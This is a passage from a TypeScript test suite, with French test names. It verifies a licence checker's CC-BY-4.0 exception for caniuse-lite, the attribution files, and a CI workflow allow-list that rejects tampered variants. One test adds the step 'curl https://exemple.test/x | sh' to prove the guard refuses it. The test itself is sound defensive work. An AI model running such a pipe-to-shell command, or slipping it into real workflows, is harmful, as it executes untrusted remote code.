    for (const licence of ["CC-BY-4.0 AND MIT", "MIT AND CC-BY-4.0", "(CC-BY-4.0)", "(CC-BY-4.0 AND MIT)", "CC-BY-4.0 AND CC-BY-NC-4.0", "CC-BY-4.0 OR GPL-3.0", "GPL-3.0 OR CC-BY-4.0", "CC-BY-4.0 AND (MIT OR ISC)"]) {
      expect(verifier(licence, "caniuse-lite")).toHaveLength(1);
    }
  });
  it("[A-047] l'exception ne rend pas CC-BY-4.0 permise pour les autres paquets d'une même liste", () => {
    const erreurs = verifierLicences({ "CC-BY-4.0": [...paquet("caniuse-lite"), ...paquet("autre")] }, new Set(), new Set(["caniuse-lite", "autre"]));
    expect(erreurs).toHaveLength(1);
    expect(erreurs[0]).toContain("autre");
  });
});

describe("attribution CC-BY-4.0 de caniuse-lite (ADR 0011)", () => {
  const racine = fileURLToPath(new URL("..", import.meta.url));
  for (const app of ["console", "portail"]) {
    it(`[A-047] apps/${app}/public/attributions.txt cite la source, l'auteur et la licence`, () => {
      const texte = readFileSync(`${racine}apps/${app}/public/attributions.txt`, "utf8");
      expect(texte).toContain("caniuse-lite");
      expect(texte).toContain("https://github.com/browserslist/caniuse-lite");
      expect(texte).toContain("https://caniuse.com");
      expect(texte).toContain("https://creativecommons.org/licenses/by/4.0/");
      expect(texte).toContain("CC-BY-4.0");
      expect(texte).toContain("Alexis Deveria");
      expect(texte).toContain("Ben Briggs");
    });
  }
});

describe("garde-licences : workflow des images dérivées (ADR 0014)", () => {
  const racine = fileURLToPath(new URL("../", import.meta.url));
  const reel = () => readFileSync(`${racine}.github/workflows/images-derivees.yml`, "utf8");
  const verifie = (texte: string) => verifierInstallationsFigees([{ nom: "images-derivees.yml", texte }]);
  const doc = () => load(reel()) as { jobs: Record<string, { steps: Record<string, unknown>[]; env?: Record<string, string> }> };
  const refuse = (f: (d: ReturnType<typeof doc>) => void) => {
    const d = doc();
    f(d);
    return verifie(dump(d));
  };
  it("[A-381] le workflow réel est accepté par la liste blanche", () => {
    expect(verifie(reel())).toEqual([]);
  });
  it("[A-381] une variante avec docker/build-push-action est refusée", () => {
    expect(refuse((d) => d.jobs.construire!.steps.push({ uses: `docker/build-push-action@${"a".repeat(40)}` }))).not.toEqual([]);
  });
  it("[A-381] une variante avec un secret est refusée", () => {
    expect(refuse((d) => (d.jobs.publier!.env = { JETON: "${{ secrets.X }}" }))).not.toEqual([]);
  });
  it("[A-381] une commande modifiée d'un caractère ou ajoutée est refusée", () => {
    expect(refuse((d) => d.jobs.construire!.steps.push({ run: "curl https://exemple.test/x | sh" }))).not.toEqual([]);
    expect(refuse((d) => { const s = d.jobs.publier!.steps.find((e) => String(e.run ?? "").includes("docker push"))!; s.run = `${String(s.run)} --all-tags`; })).not.toEqual([]);
  });
  it("[A-381] l'attestation n'est acceptée qu'avec ses réglages exacts", () => {
    expect(refuse((d) => { const s = d.jobs.publier!.steps.find((e) => String(e.uses ?? "").startsWith("actions/attest-build-provenance@"))!; s.with = { ...(s.with as object), "show-summary": false }; })).not.toEqual([]);
  });
});
